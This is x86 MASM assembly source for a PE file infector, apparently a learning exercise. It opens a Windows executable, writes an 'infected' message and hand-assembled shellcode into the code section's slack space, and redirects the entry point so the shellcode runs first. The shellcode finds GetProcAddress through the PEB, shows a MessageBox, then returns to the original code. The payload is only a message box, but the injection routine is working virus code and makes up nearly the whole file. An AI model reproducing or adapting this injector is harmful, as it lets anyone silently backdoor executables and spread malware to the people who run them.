.386 
.model flat,stdcall 

option casemap:none 

include C:\masm32\include\windows.inc 
include C:\masm32\include\kernel32.inc
includelib C:\masm32\lib\kernel32.lib
include C:\masm32\include\masm32.inc 
includelib C:\masm32\lib\masm32.lib
include C:\masm32\include\user32.inc
includelib C:\masm32\lib\user32.lib

include c:\masm32\macros\macros.asm

.data
    errorNotPEFileMsg   db  'This file is not a PEFile', 0Ah, 0
    errorOpenFileMsg   db  'Cannt Open File', 0Ah, 0
    errorFindCodeSectionMsg db  'There are some error when finding for code section', 0

    infectedMsg db  "You've been Infected", 0
    lenMsg  equ $ - infectedMsg
    shellCode   db  31h, 0C9h, 64h, 8bh, 41h, 30h, 8bh, 40h, 0Ch
                db  8bh, 70h, 14h, 0adh, 96h, 0adh, 8bh, 58h, 10h 
                db  8bh, 53h, 3ch, 1h, 0dah, 8bh, 52h, 78h, 1h, 0dah
                db  8bh, 72h, 20h, 1h, 0deh, 31h, 0c9h, 41h, 0adh, 1h
                db  0d8h, 81h, 38h, 47h, 65h, 74h, 50h, 75h, 0f4h, 81h
                db  78h, 4h, 72h, 6fh, 63h, 41h, 75h, 0ebh, 81h, 78h, 8h
                db  64h, 64h, 72h, 65h, 75h, 0e2h, 8bh, 72h, 24h, 1h, 0deh
                db  66h, 8bh, 0Ch, 4eh, 49h, 8bh, 72h, 1ch, 1h, 0deh, 8bh
                db  14h, 8eh, 1h, 0dah, 31h, 0c9h, 53h, 52h, 51h, 68h, 61h
                db  72h, 79h, 41h, 68h, 4ch, 69h, 62h, 72h, 68h, 4ch, 6fh
                db  61h, 64h, 54h, 53h, 0ffh, 0d2h, 83h, 0c4h, 0Ch, 59h, 50h
                db  51h, 66h, 0b9h, 6ch, 6ch, 51h, 68h, 33h, 32h, 2eh, 64h
                db  68h, 75h, 73h, 65h, 72h, 54h, 0ffh, 0d0h, 83h, 0c4h, 10h
                db  8bh, 54h, 24h, 4h, 0b9h, 6fh, 78h, 41h, 0h, 51h, 68h, 61h
                db  67h, 65h, 42h, 68h, 4dh, 65h, 73h, 73h, 54h, 50h, 0ffh, 0d2h
                db  83h, 0c4h, 10h, 6ah, 0h, 6ah, 0h, 68h, 0, 0, 0, 0, 6ah, 0h
                db  0ffh, 0d0h, 0b8h, 0, 0, 0, 0, 0ffh, 0e0h
    lenShellCode    equ $ - shellCode
    lengInject  equ lenShellCode + lenMsg

    filePath    db  '\\Mac\Home\Desktop\SharedWithWindows\TestPEFileInject\BASECALC.EXE', 0
    ; filePath    db  'C:\Users\KiDctf\Desktop\TestPEFileInject\c42bdc8fa6c1900c91539c647d8227c1.exe', 0

    fileHandle  dd  ?
    BytesRead   dd ?

    PEOffset    dd  ?   ; save the word in the PEHeaderOffset to test if it == PE
    MZOffset  dd  ?     ; save the begining of file to test if it == MZ
    PEHeaderOffset  dd  ?   ; Offset of begining of PE Header
    originalEntryPoint   dd  ?  ; File's original entry point
    newEntryPoint   dd  ?   ; Entry point of dirty code
    imagePage   dd  ?   ; usually 40000
    numberOfSection dd  ?
    codeSectionOffset   dd  ?   ; address (mesure in file) of the 'code' section
    codeSectionVA   dd  ?   ; address (mesure in memory) of the 'code' section
    sectionVirtualSize   dd  ?  ; used when loop through all sections
    sectionVirtualAddress   dd  ?    ; used when loop through all sections
    sectionRawSize  dd  ?    ; used when loop through all sections

    addressInfectMsg    dd  ?   ; point to dirty message

    lpBuffer    dd  0
.code

main:

getFileHandle:
    push 0                              ; hTemplateFile
    push FILE_ATTRIBUTE_NORMAL          ; dwFlagsAndAttributes
    push OPEN_EXISTING                  ; dwCreationDisposition
    push 0                              ; lpSecurityAttributes
    push 0                              ; dwShareMode
    push GENERIC_READ + GENERIC_WRITE   ; dwDesiredAccess
    push offset filePath                ; lpFileName
    call CreateFile
    cmp eax, INVALID_HANDLE_VALUE
    je errorOpenFile
    mov fileHandle, eax                 ; Now we get the handle of the file
    

checkPEFile:
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 2                              ; nNumberOfBytesToRead
    push offset MZOffset                ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile
    cmp MZOffset, 5A4Dh     ; MZ
    jne errorNotPEFile

    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push 3Ch                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 4                              ; nNumberOfBytesToRead
    push offset PEHeaderOffset          ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile
    
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push PEHeaderOffset                 ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 4                              ; nNumberOfBytesToRead
    push offset PEOffset                ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile
    cmp PEOffset, 00004550h     ; PE00
    jne errorNotPEFile

getOriginalEntryPoint:
    mov ebx, PEHeaderOffset
    add ebx, 28h
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 4                              ; nNumberOfBytesToRead
    push offset originalEntryPoint      ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile

getImageBase:
    mov ebx, PEHeaderOffset
    add ebx, 34h
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 4                              ; nNumberOfBytesToRead
    push offset imagePage               ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile

getNumberOfSection:
    mov ebx, PEHeaderOffset
    add ebx, 6h
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesRead
    push 2                              ; nNumberOfBytesToRead
    push offset numberOfSection         ; lpBuffer
    push fileHandle                     ; hFile
    call ReadFile

getOffsetCodeSection:
    mov ecx, numberOfSection
    mov ebx, PEHeaderOffset
    add ebx, 248    ; Offset of first section
    sub ebx, 40
    push ebx    ; save current offset of section
    loopSections:
        dec ecx
        cmp ecx, 0
        je errorFindCodeSection
        pop ebx
        add ebx, 40
        push ebx
        add ebx, 8  ; Virutal Size
        push FILE_BEGIN                     ; dwMoveMethod
        push NULL                           ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push fileHandle                     ; hFile
        call SetFilePointer
        push 0                              ; lpOverlapped
        push offset BytesRead               ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        push offset sectionVirtualSize      ; lpBuffer
        push fileHandle                     ; hFile
        call ReadFile

        add ebx, 4  ; Virutal Address
        push FILE_BEGIN                     ; dwMoveMethod
        push NULL                           ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push fileHandle                     ; hFile
        call SetFilePointer
        push 0                              ; lpOverlapped
        push offset BytesRead               ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        push offset sectionVirtualAddress   ; lpBuffer
        push fileHandle                     ; hFile
        call ReadFile

        mov edx, originalEntryPoint
        cmp edx, sectionVirtualAddress
        jb loopSections
        mov eax, sectionVirtualAddress
        add eax, sectionVirtualSize
        cmp edx, eax
        ja loopSections
        mov eax, sectionVirtualAddress
        xchg codeSectionVA, eax

        add ebx, 4  ; Raw Size
        push FILE_BEGIN                     ; dwMoveMethod
        push NULL                           ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push fileHandle                     ; hFile
        call SetFilePointer
        push 0                              ; lpOverlapped
        push offset BytesRead               ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        push offset sectionRawSize          ; lpBuffer
        push fileHandle                     ; hFile
        call ReadFile
        
        add ebx, 4  ; Raw Address
        push FILE_BEGIN                     ; dwMoveMethod
        push NULL                           ; lpDistanceToMoveHigh
        push ebx                            ; lDistanceToMove
        push fileHandle                     ; hFile
        call SetFilePointer
        push 0                              ; lpOverlapped
        push offset BytesRead               ; lpNumberOfBytesRead
        push 4                              ; nNumberOfBytesToRead
        push offset codeSectionOffset       ; lpBuffer
        push fileHandle                     ; hFile
        call ReadFile

ChangeVirtualSizeOfCodeSection:
    sub ebx, 12 ; virtual Size
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesWritten
    push 4                              ; nNumberOfBytesToWrite
    push offset sectionRawSize          ; lpBuffer
    push fileHandle                     ; hFile
    call WriteFile

addDataToCodeSection:
    mov ebx, codeSectionOffset
    add ebx, sectionRawSize
    sub ebx, lengInject

    mov addressInfectMsg, ebx
    mov eax, addressInfectMsg
    sub eax, codeSectionOffset
    add eax, codeSectionVA
    add eax, imagePage
    mov addressInfectMsg, eax

    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesWritten
    push lenMsg                         ; nNumberOfBytesToWrite
    push offset infectedMsg             ; lpBuffer
    push fileHandle                     ; hFile
    call WriteFile

AdjustAddressInShellCode:
    add ebx, lenMsg  
    
    mov newEntryPoint, ebx
    mov eax, newEntryPoint
    sub eax, codeSectionOffset
    add eax, codeSectionVA
    mov newEntryPoint, eax

    push ebx
    mov ebx, offset shellCode
    add ebx, 168 ; address of message
    mov eax, addressInfectMsg
    mov DWORD PTR [ebx], eax
    pop ebx

    push ebx
    mov ebx, offset shellCode
    add ebx, 177 ; address of OldEntryPoint
    mov eax, originalEntryPoint
    add eax, imagePage
    mov DWORD PTR [ebx], eax
    pop ebx

AddShellCodeToCodeSection:
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesWritten
    push lenShellCode                   ; nNumberOfBytesToWrite
    push offset shellCode               ; lpBuffer
    push fileHandle                     ; hFile
    call WriteFile

ChangeEntryPoint:
    mov ebx, PEHeaderOffset
    add ebx, 28h
    push FILE_BEGIN                     ; dwMoveMethod
    push NULL                           ; lpDistanceToMoveHigh
    push ebx                            ; lDistanceToMove
    push fileHandle                     ; hFile
    call SetFilePointer
    push 0                              ; lpOverlapped
    push offset BytesRead               ; lpNumberOfBytesWritten
    push 4                              ; nNumberOfBytesToWrite
    push offset newEntryPoint           ; lpBuffer
    push fileHandle                     ; hFile
    call WriteFile

EverythingOk:
    jmp closeFileHandle

errorOpenFile:
    push offset errorOpenFileMsg
    call StdOut
    jmp closeFileHandle

errorNotPEFile:
    push offset errorNotPEFileMsg
    call StdOut

errorFindCodeSection:
    push offset errorFindCodeSectionMsg
    call StdOut

closeFileHandle:
    push fileHandle
    call CloseHandle

exit:
    push 0
    call ExitProcess
END main